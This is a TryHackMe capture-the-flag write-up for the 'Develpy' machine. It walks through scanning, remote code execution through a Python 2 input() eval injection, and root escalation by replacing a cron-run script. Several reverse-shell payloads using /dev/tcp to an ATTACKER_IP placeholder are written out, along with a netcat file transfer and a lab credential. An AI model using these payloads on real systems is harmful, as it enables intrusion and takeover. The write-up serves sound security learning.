# CTF Writeup — Develpy

## 📌 Overview

* **Platform:** TryHackMe
* **Difficulty:** Medium
* **Objective:** User flag + Root flag (Full compromise)

Develpy is a boot2root machine originally created for the FIT and BSides Guatemala CTF. The target exposes a custom Python-based service on a non-standard port that, despite its fictional "exploit launcher" facade, contains a critical Python `input()` injection vulnerability. Initial access is gained through Remote Code Execution (RCE) via Python expression injection. Privilege escalation leverages a root-owned cron job running a script inside the `king` user's home directory — a directory that `king` controls — enabling full root compromise through script replacement.

---

## 🔍 Enumeration

### 1. Initial Reconnaissance

A fast TCP scan was performed using RustScan with aggressive service detection to identify open ports and running services.

```bash
rustscan -a 10.67.170.51 -- -A
```

**Results:**

| Port  | State | Service |
|-------|-------|---------|
| 22    | Open  | SSH     |
| 10000 | Open  | Unknown |

Port 22 is a standard SSH service. Port 10000 is commonly associated with Webmin (a web-based Unix administration panel), NDMP, or Veritas Backup Exec — all typically operating over HTTPS.

---

### 2. Further Enumeration

#### Service Fingerprinting on Port 10000

An attempt was made to connect via HTTPS, which failed immediately:

```bash
curl -k https://10.67.170.51:10000
# curl: (35) TLS connect error: error:0A00010B:SSL routines::wrong version number
```

The SSL handshake failure indicated that this was not a standard HTTPS service. A raw TCP connection via Netcat revealed the actual service:

```bash
nc 10.67.170.51 10000
```
    Private 0days
Please enther number of exploits to send??:

The service presents a custom interactive prompt. Sending a valid integer (`1`) produced simulated output resembling a ping-style response. Sending a non-integer (`id`) triggered a Python traceback:
Traceback (most recent call last):
File "./exploit.py", line 6, in <module>
num_exploits = int(input(' Please enther number of exploits to send??: '))
TypeError: int() argument must be a string or a number, not 'builtin_function_or_method'

This traceback exposed the backend script name (`exploit.py`) and confirmed the service was a Python script using `input()` — a known dangerous construct in Python 2 that evaluates the provided string as a Python expression. The application uses `int()` to wrap the result, but the expression is evaluated before the type conversion.

A buffer overflow probe was attempted:

```bash
python3 -c "print('A'*500)" | nc 10.67.170.51 10000
```

The response was another `NameError` traceback, confirming Python expression evaluation rather than a memory corruption vulnerability. The correct attack surface was identified as **Python `input()` code injection**.

---

## 💥 Exploitation

**Vulnerability:** Python `input()` Expression Injection (RCE)  
**Location:** Custom service on TCP port 10000, `exploit.py` line 6  
**Impact:** Unauthenticated Remote Code Execution as user `king`

#### Vulnerability Analysis

In Python 2, the built-in `input()` function calls `eval()` on the raw user input before returning it. This means any Python expression submitted to the prompt is executed in the interpreter's context — bypassing the intended `int()` type restriction entirely.

RCE was confirmed by injecting an OS command:

```bash
nc 10.67.170.51 10000
Please enther number of exploits to send??: import('os').system('id')
uid=1000(king) gid=1000(king) groups=1000(king),4(adm),24(cdrom),30(dip),46(plugdev),114(lpadmin),115(sambashare)
```


#### Reverse Shell

A bash reverse shell was injected using the same vector:

```bash
# Attacker — listener
nc -lvnp 4444
```

```bash
# Injected payload
__import__('os').system('bash -c "bash -i >& /dev/tcp/<ATTACKER_IP>/4444 0>&1"')
```

A stable interactive shell was obtained as user `king`.

#### User Flag

```bash
king@ubuntu:~$ cat user.txt
[FLAG OMITTED]
```

---

## 🔓 Privilege Escalation

### Local Enumeration

The home directory of `king` was enumerated immediately after gaining access:

```bash
king@ubuntu:~$ ls
credentials.png  exploit.py  root.sh  run.sh  user.txt
```

Key files of interest:

- `run.sh` — starts the vulnerable `exploit.py` service via `socat`
- `root.sh` — executes a Python script from `/root/company/media/*.py`
- `credentials.png` — a PNG image with an unknown purpose

The system-wide crontab was reviewed:

```bash
cat /etc/crontab
```









king  cd /home/king/ && bash run.sh
















root  cd /home/king/ && bash root.sh
















root  cd /root/company && bash run.sh










Two cron jobs run every minute from `/home/king/`: one as `king` (restarting the service) and one as `root` (executing `root.sh`). Since both scripts reside in `king`'s home directory, the attack surface is the home directory's write permissions.

### Identified Vector — Cron Job Script Replacement

File permissions on `root.sh` were checked:

```bash
ls -l /home/king/root.sh
-rw-r--r-- 1 root root 32 Aug 25  2019 /home/king/root.sh
```

`root.sh` is owned by root and not writable. However, since `king` owns the home directory itself, `king` can **delete** the file and **recreate** it with arbitrary content — circumventing the file-level permissions entirely.

#### Credential Recovery from `credentials.png`

Before executing the escalation, the image file was analyzed for hidden data. It was transferred to the attacker machine for inspection:

```bash
# Target
nc <ATTACKER_IP> 5555 < credentials.png

# Attacker
nc -lvnp 5555 > credentials.png
```

`strings`, `binwalk`, and `exiftool` were run on the file. Metadata revealed an artist field of `Mondrian`, and `binwalk` identified Zlib-compressed data embedded inside the PNG — characteristic of a **Piet** program (an esoteric programming language that encodes instructions as pixel colors). The image was executed using the online Npiet interpreter at `bertnase.de/npiet/npiet-execute.php`, which decoded the following credential:
king:c00ffe123!

The credential was tested with `sudo -l` but yielded no results for `king`.

#### Script Replacement Escalation

Since `king` controls the home directory, `root.sh` can be deleted and replaced with a malicious script. The root-owned cron job will execute the new file with root privileges within one minute.

```bash
# Remove the original root.sh
rm /home/king/root.sh

# Recreate it with a reverse shell payload
cat << 'EOF' > /home/king/root.sh
#!/bin/bash
bash -i >& /dev/tcp/<ATTACKER_IP>/4445 0>&1
EOF

chmod +x /home/king/root.sh
```

```bash
# Attacker — listener
nc -lvnp 4445
```

Within one minute, the cron job executes the replaced script as root, delivering a root shell.

---

## 🧠 Lessons Learned

**Python 2 `input()` is inherently dangerous.** Unlike Python 3's `input()`, which returns a raw string, Python 2's equivalent silently evaluates user-supplied input as a Python expression. Any service built on this pattern is trivially exploitable for RCE regardless of surrounding logic. When reviewing legacy Python applications, `input()` should be treated as a critical vulnerability.

**Error messages are intelligence.** The Python tracebacks exposed the backend script name, the exact line number of the vulnerability, and the interpreter version — all without any special tooling. Verbose error output in production services dramatically reduces attacker effort.

**Cron job context matters as much as file permissions.** The `root.sh` file itself was not writable, which might appear secure at a glance. However, when a privileged cron job executes a script by path from a directory owned by a lower-privileged user, the directory's write permission is the effective security boundary — not the file's. This is a common misconfiguration in CTF environments and real-world systems alike.

**Steganography and esoteric formats require a broad toolkit.** The `credentials.png` file did not yield results from `strings` or `binwalk` alone in terms of plaintext credentials. Recognizing it as a Piet program required understanding uncommon image-based encoding formats. Building familiarity with esoteric languages and steganographic techniques expands the post-exploitation toolkit significantly.

---

## 🧩 Tools Used

* **RustScan** — Fast port scanning with Nmap integration
* **Netcat** — Raw TCP connection for service interaction and file transfer
* **curl** — Initial HTTPS probe
* **strings / binwalk / exiftool** — Static analysis of `credentials.png`
* **Npiet (online)** — Execution of Piet-encoded image program

---

## ⚠️ Notes

* Flags are intentionally omitted
* This writeup focuses on methodology and learning

---
